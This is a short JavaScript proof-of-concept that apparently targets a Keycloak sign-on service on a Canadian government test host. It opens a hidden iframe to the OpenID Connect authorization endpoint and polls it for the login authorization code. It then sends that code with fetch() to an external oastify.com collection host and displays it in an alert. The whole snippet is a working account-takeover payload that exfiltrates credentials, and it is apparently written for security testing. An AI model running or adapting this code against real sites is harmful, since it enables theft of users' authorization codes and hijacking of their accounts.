const iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.src = '/auth/realms/individual/protocol/openid-connect/auth?client_id=account-js&redirect_uri=https://sso-uat.ised-isde.canada.ca/auth/realms/individual/account?referrer=ccdr-ui&response_mode=query&response_type=code&scope=openid';
document.body.appendChild(iframe);

const poller = setInterval(() => {
  try {
    const url = iframe.contentWindow.location.href;
    const code = new URL(url).searchParams.get('code');
    if (code) {
      clearInterval(poller);
      iframe.src = 'about:blank';
      iframe.remove();

      fetch('https://cdt3albawh1hfglokkeaxq2xsoygm6av.oastify.com/?code=' + code, { mode: 'no-cors' });

      alert('Authorization code extracted: ' + code);
    }
  } catch (e) {}
}, 50);

setTimeout(() => clearInterval(poller), 10000);
